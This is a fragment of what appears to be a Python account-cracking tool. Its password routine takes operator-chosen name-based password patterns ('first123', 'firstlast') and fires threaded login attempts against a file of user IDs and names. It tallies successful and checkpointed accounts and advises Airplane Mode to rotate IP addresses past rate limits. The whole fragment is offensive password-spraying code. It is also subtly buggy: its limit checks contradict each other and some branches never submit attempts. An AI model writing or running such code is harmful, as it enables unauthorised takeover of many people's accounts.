#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            pw = []
            clear()
            print(f' EXAMPLE  BD 10-18/INDIA 3-5');linex()
            sl = int(input(f'[?] PASSWORD LIMIT : '))
            clear()
            print(f'[?] EXAMPLE : first123/firstlast/first@@@')
            linex()
            if sl =='':
                print(f'[=] PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print(f' PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f' PASSWORD NO [{sr+1}] : '))
            clear()
            print(f' Total File Accounts  %s ' % len(self.id))
            print(f' PASSWORD LIMIT  {sl} ')
            print(f'  The process is running in the background')
            print(f'  Use Airplane Mode For Best Result')
            linex()
            with Habib(max_workers=30) as swagworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                swagworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                swagworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
